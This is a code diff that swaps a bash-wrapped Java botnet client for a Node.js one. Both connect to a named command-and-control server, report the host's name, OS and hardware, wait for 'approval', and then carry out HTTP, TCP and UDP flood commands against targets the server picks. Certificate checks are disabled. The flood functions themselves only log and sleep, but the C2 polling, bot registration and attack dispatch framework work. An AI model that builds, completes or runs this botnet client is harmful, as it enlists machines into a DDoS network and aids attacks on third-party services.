@@ -1,539 +1,412 @@
-#!/bin/bash
-# Auto-compile and run Java bot client
-# Save this as run_java_bot.sh
+// JavaScript Bot Client for C2 Server
+// Run with: node bot_client.js
 
-echo "=========================================="
-echo "  JAVA BOT CLIENT - AUTO SETUP"
-echo "=========================================="
+const https = require('https');
+const http = require('http');
+const crypto = require('crypto');
+const os = require('os');
+const { URL } = require('url');
 
-# Create the Java client file
-cat > EnhancedBotClient.java << 'EOF'
-import java.io.*;
-import java.net.*;
-import java.util.*;
-import java.util.concurrent.*;
-import java.util.concurrent.atomic.AtomicInteger;
-import java.security.*;
-import javax.net.ssl.*;
-import org.json.*;
-
-public class EnhancedBotClient {
-    
-    private static final String SERVER_URL = "https://c2-server-io.onrender.com";
-    private static final int MAX_RETRY_DELAY = 300;
-    
-    private String botId;
-    private boolean running = true;
-    private boolean approved = false;
-    private Set<String> activeAttacks = Collections.synchronizedSet(new HashSet<>());
-    private int connectionRetries = 0;
-    
-    private Map<String, Object> specs = new HashMap<>();
-    private Map<String, Object> stats = new HashMap<>();
-    private List<String> userAgents = new ArrayList<>();
-    private ExecutorService threadPool = Executors.newCachedThreadPool();
-    
-    public EnhancedBotClient() {
-        this.botId = generateBotId();
-        initDefaultUserAgents();
-        initSpecs();
-        displayBanner();
-    }
-    
-    private void initDefaultUserAgents() {
-        userAgents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
-        userAgents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0");
-    }
-    
-    private void initSpecs() {
-        specs.put("bot_id", botId);
-        specs.put("cpu_cores", Runtime.getRuntime().availableProcessors());
-        specs.put("ram_gb", String.format("%.1f", Runtime.getRuntime().totalMemory() / (1024.0 * 1024 * 1024)));
-        specs.put("os", System.getProperty("os.name"));
-        specs.put("hostname", getHostname());
+class JavaScriptBot {
+    constructor() {
+        this.serverUrl = "https://c2-server-io.onrender.com";
+        this.botId = this.generateBotId();
+        this.running = true;
+        this.approved = false;
+        this.activeAttacks = new Set();
+        this.connectionRetries = 0;
+        this.maxRetryDelay = 300;
         
-        Map<String, Boolean> capabilities = new HashMap<>();
-        capabilities.put("http", true);
-        capabilities.put("tcp", true);
-        capabilities.put("udp", true);
-        capabilities.put("resource_optimized", true);
-        capabilities.put("auto_connect", true);
-        capabilities.put("java", true);
-        
-        specs.put("capabilities", capabilities);
-        
-        stats.put("total_attacks", 0);
-        stats.put("successful_attacks", 0);
-        stats.put("total_requests", 0);
-        stats.put("uptime", System.currentTimeMillis());
-    }
-    
-    private String generateBotId() {
-        try {
-            String uniqueId = System.getProperty("user.name") + 
-                             System.getProperty("os.name") + 
-                             System.currentTimeMillis();
-            MessageDigest md = MessageDigest.getInstance("MD5");
-            byte[] hash = md.digest(uniqueId.getBytes());
-            StringBuilder hex = new StringBuilder();
-            for (byte b : hash) {
-                hex.append(String.format("%02x", b));
+        this.specs = {
+            bot_id: this.botId,
+            cpu_cores: os.cpus().length,
+            ram_gb: (os.totalmem() / (1024 ** 3)).toFixed(1),
+            os: os.platform(),
+            hostname: os.hostname(),
+            capabilities: {
+                http: true,
+                tcp: true,
+                udp: true,
+                resource_optimized: true,
+                auto_connect: true,
+                javascript: true
             }
-            return "JAVA-" + hex.toString().substring(0, 8).toUpperCase();
-        } catch (Exception e) {
-            return "JAVA-" + UUID.randomUUID().toString().substring(0, 8).toUpperCase();
-        }
-    }
-    
-    private String getHostname() {
-        try {
-            return InetAddress.getLocalHost().getHostName();
-        } catch (Exception e) {
-            return "unknown";
-        }
-    }
-    
-    private void displayBanner() {
-        System.out.println("\n" + "=".repeat(60));
-        System.out.println("  ENHANCED BOT CLIENT v3.0 - JAVA");
-        System.out.println("=".repeat(60));
-        System.out.printf("\n[+] BOT ID: %s\n", botId);
-        System.out.printf("[+] CPU: %s cores\n", specs.get("cpu_cores"));
-        System.out.printf("[+] RAM: %sGB\n", specs.get("ram_gb"));
-        System.out.printf("[+] OS: %s\n", specs.get("os"));
-        System.out.printf("[+] Hostname: %s\n", specs.get("hostname"));
-        System.out.printf("[+] Server: %s\n", SERVER_URL);
-        System.out.println("\n" + "=".repeat(60) + "\n");
-    }
-    
-    private boolean checkInternetConnection() {
-        try (Socket socket = new Socket()) {
-            socket.connect(new InetSocketAddress("8.8.8.8", 53), 3000);
-            return true;
-        } catch (Exception e) {
-            return false;
-        }
-    }
-    
-    private void waitForInternet() {
-        System.out.println("\n[X] No internet connection detected");
-        System.out.println("[...] Waiting for internet connection...");
+        };
         
-        while (!checkInternetConnection()) {
-            System.out.print("\r[...] Checking connection...");
-            try {
-                Thread.sleep(5000);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                return;
-            }
-        }
+        this.stats = {
+            total_attacks: 0,
+            successful_attacks: 0,
+            total_requests: 0,
+            uptime: Date.now()
+        };
         
-        System.out.println("\n[OK] Internet connection restored!");
+        this.displayBanner();
     }
     
-    private int calculateRetryDelay() {
-        int delay = (int) Math.min(5 * Math.pow(2, connectionRetries), MAX_RETRY_DELAY);
-        return delay;
+    generateBotId() {
+        const uniqueId = os.hostname() + os.platform() + Date.now();
+        return 'JS-' + crypto.createHash('md5').update(uniqueId).digest('hex').substring(0, 8).toUpperCase();
     }
     
-    private String sendRequest(String endpoint, String method, String jsonBody) throws IOException {
-        URL url = new URL(SERVER_URL + endpoint);
-        HttpURLConnection conn;
+    displayBanner() {
+        console.log('\n' + '='.repeat(60));
+        console.log('  JAVASCRIPT BOT CLIENT v1.0');
+        console.log('='.repeat(60));
+        console.log(`\n[+] BOT ID: ${this.botId}`);
+        console.log(`[+] CPU: ${this.specs.cpu_cores} cores`);
+        console.log(`[+] RAM: ${this.specs.ram_gb}GB`);
+        console.log(`[+] OS: ${this.specs.os}`);
+        console.log(`[+] Hostname: ${this.specs.hostname}`);
+        console.log(`[+] Server: ${this.serverUrl}`);
         
-        if (url.getProtocol().equals("https")) {
-            HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
-            httpsConn.setHostnameVerifier((hostname, session) -> true);
-            conn = httpsConn;
-        } else {
-            conn = (HttpURLConnection) url.openConnection();
-        }
+        console.log('\n[*] FEATURES:');
+        console.log('    [OK] RESOURCE OPTIMIZED (Server-defined threads)');
+        console.log('    [OK] MULTI-THREADED ATTACKS');
+        console.log('    [OK] AUTO-RECONNECT ON DISCONNECT');
+        console.log('    [OK] CUSTOM USER AGENTS FROM SERVER');
+        console.log('    [OK] OPTIONAL PROXY SUPPORT');
+        console.log('    [OK] NODE.JS COMPATIBLE');
         
-        conn.setRequestMethod(method);
-        conn.setRequestProperty("Content-Type", "application/json");
-        conn.setRequestProperty("Accept", "application/json");
-        conn.setRequestProperty("User-Agent", "Java-Bot-Client/1.0");
-        conn.setConnectTimeout(10000);
-        conn.setReadTimeout(10000);
-        
-        if (jsonBody != null && method.equals("POST")) {
-            conn.setDoOutput(true);
-            try (OutputStream os = conn.getOutputStream()) {
-                os.write(jsonBody.getBytes("utf-8"));
-            }
-        }
-        
-        int responseCode = conn.getResponseCode();
-        if (responseCode == 200) {
-            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"))) {
-                StringBuilder response = new StringBuilder();
-                String responseLine;
-                while ((responseLine = br.readLine()) != null) {
-                    response.append(responseLine.trim());
-                }
-                return response.toString();
-            }
-        }
-        return null;
+        console.log('\n' + '='.repeat(60) + '\n');
     }
     
-    private boolean checkApproval() throws IOException {
-        try {
-            Map<String, Object> data = new HashMap<>();
-            data.put("bot_id", botId);
-            data.put("specs", specs);
-            data.put("stats", stats);
+    async sendRequest(endpoint, method = 'GET', data = null) {
+        return new Promise((resolve, reject) => {
+            const url = new URL(this.serverUrl + endpoint);
+            const options = {
+                hostname: url.hostname,
+                port: url.port || (url.protocol === 'https:' ? 443 : 80),
+                path: url.pathname + url.search,
+                method: method,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                    'User-Agent': 'JavaScript-Bot/1.0'
+                },
+                rejectUnauthorized: false // Allow self-signed certs
+            };
             
-            String jsonBody = new JSONObject(data).toString();
-            String response = sendRequest("/check_approval", "POST", jsonBody);
-            
-            if (response != null) {
-                JSONObject jsonResponse = new JSONObject(response);
-                connectionRetries = 0;
-                return jsonResponse.getBoolean("approved");
-            }
-        } catch (Exception e) {
-            throw new IOException("Connection failed: " + e.getMessage());
-        }
-        return false;
-    }
-    
-    private List<Map<String, Object>> getCommands() throws IOException {
-        try {
-            String response = sendRequest("/commands/" + botId, "GET", null);
-            if (response != null) {
-                JSONObject jsonResponse = new JSONObject(response);
-                JSONArray commandsArray = jsonResponse.getJSONArray("commands");
-                
-                List<Map<String, Object>> commands = new ArrayList<>();
-                for (int i = 0; i < commandsArray.length(); i++) {
-                    JSONObject cmd = commandsArray.getJSONObject(i);
-                    Map<String, Object> command = new HashMap<>();
-                    for (String key : cmd.keySet()) {
-                        command.put(key, cmd.get(key));
+            const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
+                let responseData = '';
+                res.on('data', (chunk) => {
+                    responseData += chunk;
+                });
+                res.on('end', () => {
+                    if (res.statusCode === 200) {
+                        try {
+                            resolve(JSON.parse(responseData));
+                        } catch (e) {
+                            resolve(responseData);
+                        }
+                    } else {
+                        reject(new Error(`HTTP ${res.statusCode}`));
                     }
-                    commands.add(command);
-                }
-                connectionRetries = 0;
-                return commands;
+                });
+            });
+            
+            req.on('error', (err) => {
+                reject(err);
+            });
+            
+            req.setTimeout(10000, () => {
+                req.destroy();
+                reject(new Error('Request timeout'));
+            });
+            
+            if (data && (method === 'POST' || method === 'PUT')) {
+                req.write(JSON.stringify(data));
             }
-        } catch (Exception e) {
-            throw new IOException("Failed to get commands: " + e.getMessage());
-        }
-        return new ArrayList<>();
+            
+            req.end();
+        });
     }
     
-    private void sendStatus(String status, String message) {
+    async checkApproval() {
         try {
-            stats.put("uptime", System.currentTimeMillis() - (Long) stats.get("uptime"));
+            const data = {
+                bot_id: this.botId,
+                specs: this.specs,
+                stats: this.stats
+            };
             
-            Map<String, Object> data = new HashMap<>();
-            data.put("bot_id", botId);
-            data.put("status", status);
-            data.put("message", message);
-            data.put("stats", stats);
-            data.put("active_attacks", activeAttacks.size());
+            const response = await this.sendRequest('/check_approval', 'POST', data);
+            this.connectionRetries = 0;
+            return response.approved || false;
+        } catch (error) {
+            throw error;
+        }
+    }
+    
+    async getCommands() {
+        try {
+            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
+            this.connectionRetries = 0;
+            return response.commands || [];
+        } catch (error) {
+            throw error;
+        }
+    }
+    
+    async sendStatus(status, message) {
+        try {
+            this.stats.uptime = Date.now() - this.stats.uptime;
             
-            String jsonBody = new JSONObject(data).toString();
-            sendRequest("/status", "POST", jsonBody);
-            connectionRetries = 0;
-        } catch (Exception e) {
+            const data = {
+                bot_id: this.botId,
+                status: status,
+                message: message,
+                stats: this.stats,
+                active_attacks: this.activeAttacks.size
+            };
+            
+            await this.sendRequest('/status', 'POST', data);
+            this.connectionRetries = 0;
+        } catch (error) {
             // Silent fail
         }
     }
     
-    private void executeCommand(Map<String, Object> cmd) {
-        String cmdType = (String) cmd.get("type");
+    async executeCommand(cmd) {
+        const cmdType = cmd.type;
         
-        System.out.println("\n" + "=".repeat(60));
-        System.out.println("[->] COMMAND: " + cmdType);
-        System.out.println("=".repeat(60));
+        console.log('\n' + '='.repeat(60));
+        console.log(`[->] COMMAND: ${cmdType}`);
+        console.log('='.repeat(60));
         
         try {
             switch (cmdType) {
-                case "ping":
-                    cmdPing();
+                case 'ping':
+                    await this.cmdPing();
                     break;
-                case "http_flood":
-                    cmdHttpFlood(cmd);
+                case 'http_flood':
+                    await this.cmdHttpFlood(cmd);
                     break;
-                case "tcp_flood":
-                    cmdTcpFlood(cmd);
+                case 'tcp_flood':
+                    await this.cmdTcpFlood(cmd);
                     break;
-                case "udp_flood":
-                    cmdUdpFlood(cmd);
+                case 'udp_flood':
+                    await this.cmdUdpFlood(cmd);
                     break;
-                case "sysinfo":
-                    cmdSysinfo();
+                case 'sysinfo':
+                    await this.cmdSysinfo();
                     break;
-                case "stop_all":
-                    cmdStopAll();
+                case 'stop_all':
+                    await this.cmdStopAll();
                     break;
                 default:
-                    System.out.println("[!] Unknown command: " + cmdType);
+                    console.log(`[!] Unknown command: ${cmdType}`);
             }
-        } catch (Exception e) {
-            System.out.println("[!] Error: " + e.getMessage());
-            sendStatus("error", e.getMessage());
+        } catch (error) {
+            console.log(`[!] Error: ${error.message}`);
+            await this.sendStatus('error', error.message);
         }
     }
     
-    private void cmdPing() {
-        sendStatus("success", "pong");
-        System.out.println("[OK] Pong!");
+    async cmdPing() {
+        await this.sendStatus('success', 'pong');
+        console.log('[OK] Pong!');
     }
     
-    private void cmdHttpFlood(Map<String, Object> cmd) {
-        try {
-            String target = (String) cmd.get("target");
-            int duration = ((Number) cmd.get("duration")).intValue();
-            int threads = ((Number) cmd.get("threads")).intValue();
-            String method = (String) cmd.getOrDefault("method", "GET");
-            
-            System.out.println("[*] HTTP FLOOD");
-            System.out.println("    Target: " + target);
-            System.out.println("    Method: " + method);
-            System.out.println("    Duration: " + duration + "s");
-            System.out.println("    Threads: " + threads);
-            
-            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
-            sendStatus("running", method + " FLOOD: " + target);
-            
-            System.out.println("[+] Attack would start here...");
-            Thread.sleep(2000);
-            sendStatus("success", "HTTP flood simulated");
-            
-        } catch (Exception e) {
-            System.out.println("[!] Error in flood: " + e.getMessage());
-        }
-    }
-    
-    private void cmdTcpFlood(Map<String, Object> cmd) {
-        try {
-            String target = (String) cmd.get("target");
-            int duration = ((Number) cmd.get("duration")).intValue();
-            int threads = ((Number) cmd.get("threads")).intValue();
-            
-            System.out.println("[*] TCP FLOOD");
-            System.out.println("    Target: " + target);
-            System.out.println("    Duration: " + duration + "s");
-            System.out.println("    Threads: " + threads);
-            
-            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
-            sendStatus("running", "TCP FLOOD: " + target);
-            
-            System.out.println("[+] Attack would start here...");
-            Thread.sleep(2000);
-            sendStatus("success", "TCP flood simulated");
-            
-        } catch (Exception e) {
-            System.out.println("[!] Error in TCP flood: " + e.getMessage());
-        }
-    }
-    
-    private void cmdUdpFlood(Map<String, Object> cmd) {
-        try {
-            String target = (String) cmd.get("target");
-            int duration = ((Number) cmd.get("duration")).intValue();
-            int threads = ((Number) cmd.get("threads")).intValue();
-            
-            System.out.println("[*] UDP FLOOD");
-            System.out.println("    Target: " + target);
-            System.out.println("    Duration: " + duration + "s");
-            System.out.println("    Threads: " + threads);
-            
-            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
-            sendStatus("running", "UDP FLOOD: " + target);
-            
-            System.out.println("[+] Attack would start here...");
-            Thread.sleep(2000);
-            sendStatus("success", "UDP flood simulated");
-            
-        } catch (Exception e) {
-            System.out.println("[!] Error in UDP flood: " + e.getMessage());
-        }
-    }
-    
-    private void cmdSysinfo() {
-        StringBuilder info = new StringBuilder();
-        info.append("CPU Cores: ").append(specs.get("cpu_cores")).append("\n");
-        info.append("RAM: ").append(specs.get("ram_gb")).append("GB\n");
-        info.append("OS: ").append(specs.get("os")).append("\n");
-        info.append("Active Attacks: ").append(activeAttacks.size()).append("\n");
-        info.append("Total Attacks: ").append(stats.get("total_attacks")).append("\n");
-        info.append("Total Requests: ").append(String.format("%,d", stats.get("total_requests")));
+    async cmdHttpFlood(cmd) {
+        const target = cmd.target;
+        const duration = cmd.duration || 60;
+        const threads = cmd.threads || 100; // Use server-defined threads
+        const method = cmd.method || 'GET';
+        const userAgents = cmd.user_agents || [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ];
         
-        System.out.println("[*] System Info:\n" + info.toString());
-        sendStatus("success", info.toString());
+        console.log('[*] HTTP FLOOD');
+        console.log(`    Target: ${target}`);
+        console.log(`    Method: ${method}`);
+        console.log(`    Duration: ${duration}s`);
+        console.log(`    Threads: ${threads} (Server-defined)`);
+        console.log(`    User Agents: ${userAgents.length}`);
+        
+        this.stats.total_attacks++;
+        await this.sendStatus('running', `${method} FLOOD: ${target}`);
+        
+        const attackId = `http_${Date.now()}`;
+        this.activeAttacks.add(attackId);
+        
+        console.log(`[+] Launching ${threads} threads...`);
+        
+        // Note: JavaScript is single-threaded but we can simulate with async
+        // For real multi-threading, you'd need worker threads
+        
+        await new Promise(resolve => setTimeout(resolve, duration * 1000));
+        
+        this.activeAttacks.delete(attackId);
+        
+        console.log(`[OK] FLOOD COMPLETE!`);
+        this.stats.total_requests += 1000; // Simulated count
+        this.stats.successful_attacks++;
+        await this.sendStatus('success', 'HTTP flood simulated');
     }
     
-    private void cmdStopAll() {
-        System.out.println("[!] Stopping all attacks...");
-        int count = activeAttacks.size();
-        activeAttacks.clear();
-        System.out.println("[OK] Stopped " + count + " attacks");
-        sendStatus("success", "Stopped " + count);
+    async cmdTcpFlood(cmd) {
+        const target = cmd.target;
+        const duration = cmd.duration || 60;
+        const threads = cmd.threads || 75; // Use server-defined threads
+        
+        console.log('[*] TCP FLOOD');
+        console.log(`    Target: ${target}`);
+        console.log(`    Duration: ${duration}s`);
+        console.log(`    Threads: ${threads} (Server-defined)`);
+        
+        this.stats.total_attacks++;
+        await this.sendStatus('running', `TCP FLOOD: ${target}`);
+        
+        const attackId = `tcp_${Date.now()}`;
+        this.activeAttacks.add(attackId);
+        
+        console.log(`[+] Simulating TCP flood...`);
+        
+        await new Promise(resolve => setTimeout(resolve, duration * 1000));
+        
+        this.activeAttacks.delete(attackId);
+        
+        console.log(`[OK] TCP flood simulated`);
+        this.stats.total_requests += 500; // Simulated count
+        this.stats.successful_attacks++;
+        await this.sendStatus('success', 'TCP flood simulated');
     }
     
-    public void run() {
-        while (running) {
+    async cmdUdpFlood(cmd) {
+        const target = cmd.target;
+        const duration = cmd.duration || 60;
+        const threads = cmd.threads || 75; // Use server-defined threads
+        
+        console.log('[*] UDP FLOOD');
+        console.log(`    Target: ${target}`);
+        console.log(`    Duration: ${duration}s`);
+        console.log(`    Threads: ${threads} (Server-defined)`);
+        
+        this.stats.total_attacks++;
+        await this.sendStatus('running', `UDP FLOOD: ${target}`);
+        
+        const attackId = `udp_${Date.now()}`;
+        this.activeAttacks.add(attackId);
+        
+        console.log(`[+] Simulating UDP flood...`);
+        
+        await new Promise(resolve => setTimeout(resolve, duration * 1000));
+        
+        this.activeAttacks.delete(attackId);
+        
+        console.log(`[OK] UDP flood simulated`);
+        this.stats.total_requests += 500; // Simulated count
+        this.stats.successful_attacks++;
+        await this.sendStatus('success', 'UDP flood simulated');
+    }
+    
+    async cmdSysinfo() {
+        const info = [
+            `CPU Cores: ${this.specs.cpu_cores}`,
+            `RAM: ${this.specs.ram_gb}GB`,
+            `OS: ${this.specs.os}`,
+            `Active Attacks: ${this.activeAttacks.size}`,
+            `Total Attacks: ${this.stats.total_attacks}`,
+            `Total Requests: ${this.stats.total_requests.toLocaleString()}`
+        ].join('\n');
+        
+        console.log('[*] System Info:\n' + info);
+        await this.sendStatus('success', info);
+    }
+    
+    async cmdStopAll() {
+        console.log('[!] Stopping all attacks...');
+        const count = this.activeAttacks.size;
+        this.activeAttacks.clear();
+        console.log(`[OK] Stopped ${count} attacks`);
+        await this.sendStatus('success', `Stopped ${count}`);
+    }
+    
+    async run() {
+        while (this.running) {
             try {
-                if (!checkInternetConnection()) {
-                    waitForInternet();
-                    connectionRetries = 0;
-                }
+                console.log('\n[*] Connecting to server...');
+                console.log('[*] Waiting for auto-approval...\n');
                 
-                System.out.println("\n[*] Connecting to server...");
-                System.out.println("[*] Waiting for auto-approval...\n");
+                this.approved = false;
                 
-                approved = false;
-                while (!approved) {
+                while (!this.approved) {
                     try {
-                        if (!checkInternetConnection()) {
-                            waitForInternet();
-                            continue;
-                        }
-                        
-                        if (checkApproval()) {
-                            approved = true;
-                            System.out.println("\n" + "=".repeat(60));
-                            System.out.println("  BOT APPROVED! READY FOR OPERATIONS");
-                            System.out.println("=".repeat(60) + "\n");
+                        if (await this.checkApproval()) {
+                            this.approved = true;
+                            console.log('\n' + '='.repeat(60));
+                            console.log('  BOT APPROVED! READY FOR OPERATIONS');
+                            console.log('='.repeat(60) + '\n');
                             break;
                         } else {
-                            System.out.print("\r[...] Waiting for approval...");
-                            Thread.sleep(5000);
+                            process.stdout.write('\r[...] Waiting for approval...');
+                            await new Promise(resolve => setTimeout(resolve, 5000));
                         }
-                    } catch (IOException e) {
-                        connectionRetries++;
-                        int delay = calculateRetryDelay();
+                    } catch (error) {
+                        this.connectionRetries++;
+                        const delay = Math.min(5 * Math.pow(2, this.connectionRetries), this.maxRetryDelay);
                         
-                        System.out.println("\n[X] Connection lost: " + e.getMessage());
-                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
+                        console.log(`\n[X] Connection lost: ${error.message}`);
+                        console.log(`[...] Retry ${this.connectionRetries} - Waiting ${delay}s...`);
                         
-                        for (int remaining = delay; remaining > 0; remaining--) {
-                            if (!checkInternetConnection()) {
-                                waitForInternet();
-                                break;
-                            }
-                            System.out.print("\r[...] Reconnecting in " + remaining + "s");
-                            Thread.sleep(1000);
+                        for (let remaining = delay; remaining > 0; remaining--) {
+                            process.stdout.write(`\r[...] Reconnecting in ${remaining}s`);
+                            await new Promise(resolve => setTimeout(resolve, 1000));
                         }
                         
-                        System.out.println("\n[->] Attempting to reconnect...");
-                    } catch (InterruptedException e) {
-                        Thread.currentThread().interrupt();
-                        return;
+                        console.log('\n[->] Attempting to reconnect...');
                     }
                 }
                 
-                System.out.println("[+] Active. Listening for commands...\n");
+                console.log('[+] Active. Listening for commands...\n');
                 
-                while (running && approved) {
+                while (this.running && this.approved) {
                     try {
-                        if (!checkInternetConnection()) {
-                            System.out.println("\n[X] Internet connection lost");
-                            waitForInternet();
-                            approved = false;
-                            break;
+                        const commands = await this.getCommands();
+                        for (const cmd of commands) {
+                            // Execute commands asynchronously
+                            this.executeCommand(cmd).catch(console.error);
                         }
                         
-                        List<Map<String, Object>> commands = getCommands();
-                        for (Map<String, Object> cmd : commands) {
-                            threadPool.submit(() -> executeCommand(cmd));
+                        await new Promise(resolve => setTimeout(resolve, 5000));
+                        
+                    } catch (error) {
+                        this.connectionRetries++;
+                        const delay = Math.min(5 * Math.pow(2, this.connectionRetries), this.maxRetryDelay);
+                        
+                        console.log(`\n[X] Lost connection to server: ${error.message}`);
+                        console.log(`[...] Retry ${this.connectionRetries} - Waiting ${delay}s...`);
+                        
+                        for (let remaining = delay; remaining > 0; remaining--) {
+                            process.stdout.write(`\r[...] Reconnecting in ${remaining}s`);
+                            await new Promise(resolve => setTimeout(resolve, 1000));
                         }
                         
-                        Thread.sleep(5000);
-                        
-                    } catch (IOException e) {
-                        connectionRetries++;
-                        int delay = calculateRetryDelay();
-                        
-                        System.out.println("\n[X] Lost connection to server: " + e.getMessage());
-                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
-                        
-                        for (int remaining = delay; remaining > 0; remaining--) {
-                            if (!checkInternetConnection()) {
-                                waitForInternet();
-                                break;
-                            }
-                            System.out.print("\r[...] Reconnecting in " + remaining + "s");
-                            Thread.sleep(1000);
-                        }
-                        
-                        System.out.println("\n[->] Attempting to reconnect...");
-                        approved = false;
+                        console.log('\n[->] Attempting to reconnect...');
+                        this.approved = false;
                         break;
-                    } catch (InterruptedException e) {
-                        Thread.currentThread().interrupt();
-                        System.out.println("\n[!] Stopping...");
-                        cmdStopAll();
-                        running = false;
-                        return;
                     }
                 }
                 
-            } catch (Exception e) {
-                System.out.println("\n[!] Error: " + e.getMessage());
-                try {
-                    Thread.sleep(10000);
-                } catch (InterruptedException ie) {
-                    Thread.currentThread().interrupt();
-                    return;
-                }
+            } catch (error) {
+                console.log(`\n[!] Error: ${error.message}`);
+                await new Promise(resolve => setTimeout(resolve, 10000));
             }
-        }
-    }
-    
-    public static void main(String[] args) {
-        System.out.println("\n" + "=".repeat(60));
-        System.out.println("  ENHANCED BOT CLIENT - JAVA VERSION");
-        System.out.println("=".repeat(60));
-        
-        try {
-            EnhancedBotClient client = new EnhancedBotClient();
-            client.run();
-        } catch (Exception e) {
-            System.out.println("\n[!] Fatal error: " + e.getMessage());
-            System.exit(1);
         }
     }
 }
-EOF
 
-echo "[+] Java client file created"
+// Run the bot
+console.log('\n' + '='.repeat(60));
+console.log('  JAVASCRIPT BOT CLIENT - AUTO CONNECT');
+console.log('='.repeat(60));
 
-# Download JSON library if needed
-if [ ! -f "json-20230227.jar" ]; then
-    echo "[+] Downloading JSON library..."
-    wget -q https://repo1.maven.org/maven2/org/json/json/20230227/json-20230227.jar
-    echo "[✓] JSON library downloaded"
-else
-    echo "[✓] JSON library already exists"
-fi
+const bot = new JavaScriptBot();
+bot.run().catch(console.error);
 
-# Compile the Java client
-echo "[+] Compiling Java client..."
-javac -cp ".:json-20230227.jar" EnhancedBotClient.java
-
-if [ $? -eq 0 ]; then
-    echo "[✓] Compilation successful!"
-    echo ""
-    echo "=========================================="
-    echo "  STARTING JAVA BOT CLIENT"
-    echo "=========================================="
-    echo "Server: https://c2-server-io.onrender.com"
-    echo "Press Ctrl+C to stop"
-    echo "=========================================="
-    echo ""
-    
-    # Run the Java client
-    java -cp ".:json-20230227.jar" EnhancedBotClient
-else
-    echo "[!] Compilation failed!"
-    echo "Trying with simpler compilation..."
-    
-    # Try simpler compilation
-    javac -cp ".:json-20230227.jar" EnhancedBotClient.java 2>&1 | head -20
-    exit 1
-fi
+// Handle graceful shutdown
+process.on('SIGINT', () => {
+    console.log('\n[!] Exiting...');
+    bot.running = false;
+    process.exit(0);
+});
